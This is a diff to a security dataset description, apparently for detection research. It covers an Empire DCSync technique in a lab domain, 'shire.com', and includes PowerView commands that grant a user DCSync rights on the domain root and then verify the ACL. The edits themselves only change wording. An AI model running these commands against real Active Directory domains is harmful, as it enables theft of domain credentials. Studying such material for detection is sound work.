@@ -1,7 +1,7 @@
 
 # Empire DCSync
 
-An adversary with DA permissions can add an ACL to the Root Domain for any user, despite being in no privileged groups, having no malicious sidHistory, and not having local admin rights on the domain controller itself .
+An adversary with enough permissions (domain admin) can add an ACL to the Root Domain for any user, despite being in no privileged groups, having no malicious sidHistory, and not having local admin rights on the domain controller itself .
 
 ## Technique(s) ID
 
@@ -25,7 +25,7 @@ Shire
 
 ## About this file
 
-| log_name                                 | task                                                   |   record_number |
+| log_name                                 | task                                                   |   events_count  |
 |------------------------------------------|--------------------------------------------------------|-----------------|
 | Windows PowerShell                       | Pipeline Execution Details                             |             280 |
 | Windows PowerShell                       | Provider Lifecycle                                     |               8 |
@@ -65,7 +65,7 @@ scriptimport data/module_source/situational_awareness/network/powerview.ps1
 scriptcmd Add-DomainObjectAcl -TargetIdentity "dc=shire,dc=com" -TargetDomain shire.com -PrincipalIdentity nmartha -Rights DCSync
 ```
 
-You can verify that his was applied in Empire by running the following commands:
+You can verify that it worked by running the following commands:
 
 ```
 scriptcmd $nmarthaSid = Get-DomainUser nmartha | Select-Object -ExpandProperty objectsid; Get-DomainObjectACL  "dc=shire,dc=com" -Domain shire.com -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $nmarthaSid}
